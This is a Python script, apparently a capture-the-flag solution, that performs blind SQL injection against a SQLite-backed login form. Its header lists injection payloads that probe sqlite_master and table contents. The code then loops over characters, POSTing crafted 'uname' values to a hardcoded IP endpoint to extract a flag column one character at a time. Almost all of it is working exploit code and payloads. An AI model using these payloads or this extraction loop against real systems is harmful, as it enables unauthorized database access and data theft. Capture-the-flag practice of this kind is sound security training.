"""
# FLAG FORMAT : FLAG{} or SBCTF{}

# HINT TABLE NAME : flag

# Blind SQl Injection :

# Testing expressions :

    ' union select sleep(25)--
    ' or password <>''--
    ' or length(username)>1
    ' or (SELECT (CASE WHEN (1=1) THEN true ELSE false END))--
    ' or (SELECT (CASE WHEN (SELECT sqlite_version())<>'' THEN true ELSE false END))--

i.e EXPLOIT : 

' or (SELECT (CASE WHEN (SELECT COUNT(*) FROM flag )=1 THEN true ELSE false END))--

' or (SELECT (CASE WHEN (SELECT count(sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag')=1 THEN true ELSE false END))--

' or (SELECT (CASE WHEN (SELECT substr(sql,1,1) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='flag')='C' THEN true ELSE false END))--


' or (SELECT (CASE WHEN (SELECT group_concat(sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag') LIKE 'CREATE TABLE flag%' THEN true ELSE false END))--

' or (SELECT (CASE WHEN (SELECT count(flaggedflag) FROM flag)=1 THEN true ELSE false END))--

"""

import requests, string, sys

alph = string.ascii_letters + string.digits + "!\"#$&'()*+,-./:;<=>?@[\\]^`{|}~ " # or use string.punctuation if you u got n0thing to remove.

url = "http://18.194.166.81:3334/old-login"

dumped_str = ['S','B','C','T','F','{']

col_name = "flaggedflag" # PS : escape special chars (ie: _ ) in sqlite ;)


"""
data = {
    'uname' : "' or (SELECT (CASE WHEN (SELECT group_concat(sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag') LIKE 'CREATE TABLE flag{}%' THEN true ELSE false END))--".format(''.join(col_name)+i),
    'psw': ""
}

req = requests.post(url = url, data = data)
print(req.text)
sys.exit()
"""

#
# DUMP DUMPER XD
#

for count in range(7, 100):
    for i in alph:
        # escape special chars.
        data = {
            'uname' : "' or (SELECT (CASE WHEN (SELECT substr(flaggedflag,{},1) FROM flag)='{}' THEN true ELSE false END))--".format(count, i),
            'psw': ""
        }

        req = requests.post(url = url, data = data)

        if 'did' in req.text:
            print("[{}] : {}".format(count, i))
            dumped_str.append(i)
            break

        # piw piw 0--> -----> [FLAG]
        if dumped_str[-1] == '}':
            print("FLAG : ", ''.join(dumped_str))
            sys.exit()
